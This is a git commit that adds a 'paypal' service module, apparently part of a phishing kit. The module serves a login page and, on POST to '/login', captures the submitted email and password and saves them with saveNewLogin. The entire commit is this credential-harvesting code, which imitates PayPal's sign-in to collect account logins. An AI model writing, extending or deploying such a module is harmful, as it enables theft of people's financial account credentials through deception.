ac460c83f24ed010f4f599ca839c717feb6307eb
XeliteXirish <shaunoneill7@me.com>
2018-02-06 14:55:45 +0000

    Paypal

---
+++ src/services/paypal.js
@@ -0,0 +1,20 @@
+exports.info = {
+    name: 'paypal',
+    views: '/paypal/views',
+    static: '/paypal/static'
+};
+
+exports.execute = function (app, schemaUtils) {
+    app.get('/', async (req, res) => {
+        res.render('index');
+    });
+
+    app.post('/login', async (req, res) => {
+        let email = req.body.session.username_or_email;
+        let pass = req.body.session.password;
+        if (email && pass) {
+            schemaUtils.saveNewLogin(exports.info.name, email, pass);
+        }
+        res.status(200).redirect('/');
+    })
+};
